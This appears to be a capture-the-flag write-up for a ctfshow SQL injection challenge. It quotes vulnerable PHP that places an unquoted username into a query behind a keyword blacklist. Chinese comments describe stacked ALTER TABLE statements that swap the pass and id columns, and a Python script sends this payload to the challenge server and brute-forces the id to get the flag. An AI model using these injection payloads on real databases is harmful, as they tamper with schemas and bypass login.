'''
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }

'''

'''

利用alter更改列名 一开始想着把username更改为pass，然后查出来的就是字符串用户名，
和数字0进行弱类型比较就可以了，但是实际尝试发现不行，
看了一下发现这题没有检查传入的password是不是数字，
而且没有用intval对password进行处理，所以这样不行，
那就把id改成pass，然后爆破id就可以了。

    更新表字段
1;alter table `ctfshow_user` change `pass` `feng` varchar(255); alter table `ctfshow_user` change `id` `pass` varchar(255)

username是0或者0x61646d696e，password从1开始用burpsuite爆破即可
最好使用0x61646d696e
'''

# @Author:Y4tacker
import requests

url = "http://6f238100-63b0-42f5-b81d-f59707a31786.chall.ctf.show:8080/api/index.php"
for i in range(100):
    if i == 0:
        data = {
            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '
                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '
                        'varchar(255);',
            'password': f'{i}'
        }
        r = requests.post(url, data=data)
    data = {
        'username': '0x61646d696e',
        'password': f'{i}'
    }
    r = requests.post(url, data=data)
    if "登陆成功" in r.json()['msg']:
        print(f'id={i}')
        print(r.json()['msg'])
        break
